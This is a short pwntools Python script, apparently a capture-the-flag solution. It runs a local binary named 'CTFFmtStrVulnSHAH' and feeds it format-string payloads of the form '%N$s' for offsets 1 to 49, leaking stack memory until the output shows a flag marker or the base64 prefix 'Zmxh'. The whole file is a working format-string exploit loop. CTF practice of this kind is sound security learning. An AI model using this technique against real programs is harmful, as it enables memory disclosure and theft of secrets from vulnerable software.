import os
from pwn import *

# Set up the binary
binary = "./CTFFmtStrVulnSHAH"

# Loop through stack offsets
for i in range(1, 50):  # Adjust the range if needed
    try:
        # Run the program
        process_instance = process(binary)
        
        # Create the payload to test the current offset
        payload = f"%{i}$s"
        print(f"Trying payload: {payload}")
        
        # Send the payload
        process_instance.sendline(payload)
        
        # Receive and print the output
        response = process_instance.recvall(timeout=1).decode('utf-8', errors='ignore')
        print(f"Offset {i}: {response}")
        
        # Check if response contains something meaningful
        if "Zmxh" in response or "flag" in response:  # Adjust based on what you expect
            print(f"Potential flag found at offset {i}: {response}")
            break
        
    except Exception as e:
        print(f"Error with offset {i}: {e}")
    finally:
        process_instance.close()
